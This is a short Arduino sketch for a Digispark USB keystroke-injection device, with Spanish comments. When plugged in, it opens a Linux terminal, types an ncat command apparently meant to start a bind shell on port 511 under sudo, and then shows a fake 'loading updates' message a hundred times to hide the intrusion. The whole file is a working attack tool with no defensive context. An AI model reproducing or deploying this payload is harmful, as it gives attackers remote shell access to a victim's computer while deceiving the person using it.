#include "DigiKeyboard.h"

void setup(){
  //esperamos un tiempo de carga
  DigiKeyboard.delay(2000);
  //abrimos una terminal
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(2000);
  //codigo de conexion
  DigiKeyboard.println("sudo ncat /l /p 511 /e &bin&sh");
  DigiKeyboard.delay(2000);
  //mensaje falso de actualizacion
  for(int i=0; i<= 100; i++){
    DigiKeyboard.println("Cargando actualizaciones, espere...");
    DigiKeyboard.delay(2000);
  }
}

void loop(){
  
}
